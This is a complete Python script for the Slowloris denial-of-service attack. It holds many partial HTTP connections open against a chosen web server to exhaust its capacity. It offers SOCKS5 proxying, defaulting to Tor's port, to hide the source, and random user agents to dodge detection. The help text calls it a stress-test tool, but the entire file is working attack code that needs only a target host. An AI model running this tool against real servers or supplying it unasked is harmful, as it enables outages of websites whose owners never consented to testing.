#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
from tqdm import tqdm

try:
    import socks
except ImportError:
    # Set a placeholder if socks is not available.
    socks = None
try:
    from tqdm import tqdm
except ImportError:
    # Set a placeholder if tqdm is not available.
    tqdm = None


class Slowloris:
    def __init__(self, host, port, sockets, proxy_host=None, proxy_port=None, https=False, sleeptime=15, randuseragent=False, useproxy=False):
        self.host = host
        self.port = port
        self.sockets_count = sockets
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.https = https
        self.sleeptime = sleeptime
        self.randuseragent = randuseragent
        self.useproxy = useproxy
        self.list_of_sockets = []
        self.user_agents = self._load_user_agents()

        if self.useproxy and not socks:
            logging.error("Socks Proxy Library Not Available! Please install PySocks.")
            sys.exit(1)
            
        if not tqdm:
            logging.error("tqdm library not found! Please install tqdm.")
            sys.exit(1)

    def _load_user_agents(self):
        try:
            with open("user_agents.txt", "r") as f:
                return [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            logging.error("user_agents.txt not found!")
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"]

    def _create_socket(self):
        s = None
        if self.useproxy:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(socks.PROXY_TYPE_SOCKS5, self.proxy_host, self.proxy_port)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.settimeout(4)

        if self.https:
            try:
                import ssl
                s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLS)
            except ImportError:
                logging.error("SSL support not available, can't use HTTPS!")
                sys.exit(1)
        
        return s

    def init_socket(self):
        s = self._create_socket()
        try:
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            ua = random.choice(self.user_agents) if self.randuseragent else self.user_agents[0]
            s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except (socks.ProxyConnectionError, socket.error) as e:
            if self.useproxy:
                logging.error(
                    f"Failed to connect to proxy ({self.proxy_host}:{self.proxy_port}). "
                    f"Please check if the proxy server is running and the address is correct."
                )
            logging.debug(f"Failed to connect to {self.host}:{self.port}: {e}")
            return None

    def attempt_reconnect(self):
        logging.info("Re-creating closed sockets...")
        for i in range(self.sockets_count - len(self.list_of_sockets)):
            s = self.init_socket()
            if s:
                self.list_of_sockets.append(s)

    def attack(self):
        logging.info(f"Attacking {self.host} with {self.sockets_count} sockets.")
        logging.info("Creating sockets...")
        with tqdm(total=self.sockets_count, desc="Initializing Sockets", unit="socket") as pbar:
            for _ in range(self.sockets_count):
                s = self.init_socket()
                if s:
                    self.list_of_sockets.append(s)
                    pbar.update(1)

        pbar = tqdm(total=self.sockets_count, desc="Attack Status", unit="socket", leave=True)
        pbar.update(len(self.list_of_sockets))

        while True:
            try:
                logging.info(f"Sending keep-alive headers... Socket count: {len(self.list_of_sockets)}")
                for s in list(self.list_of_sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except socket.error:
                        self.list_of_sockets.remove(s)
                
                pbar.n = len(self.list_of_sockets)
                pbar.refresh()

                if len(self.list_of_sockets) < self.sockets_count:
                    self.attempt_reconnect()

                time.sleep(self.sleeptime)

            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping Slowloris")
                break
            except Exception as e:
                logging.debug(f"Error in Slowloris iteration: {e}")
                self.attempt_reconnect()


def main():
    parser = argparse.ArgumentParser(
        description="Slowloris, low bandwidth stress test tool for websites"
    )
    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
    parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
    parser.add_argument("-s", "--sockets", default=150, help="Number of sockets to use in the test", type=int)
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Increases logging")
    parser.add_argument("-ua", "--randuseragents", dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
    parser.add_argument("-x", "--useproxy", dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
    parser.add_argument("--proxy-port", default=9050, help="SOCKS5 proxy port", type=int)
    parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
    parser.add_argument("--sleeptime", dest="sleeptime", default=15, type=int, help="Time to sleep between each header sent.")
    
    args = parser.parse_args()

    if not args.host:
        try:
            host = input("Sitio web de destino: ")
            if not host:
                parser.print_help()
                sys.exit(1)
            args.host = host
        except KeyboardInterrupt:
            print("\nSaliendo.")
            sys.exit(0)

    logging.basicConfig(
        format="%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    slowloris = Slowloris(
        args.host,
        args.port,
        args.sockets,
        args.proxy_host,
        args.proxy_port,
        args.https,
        args.sleeptime,
        args.randuseragent,
        args.useproxy,
    )

    slowloris.attack()

if __name__ == "__main__":
    main()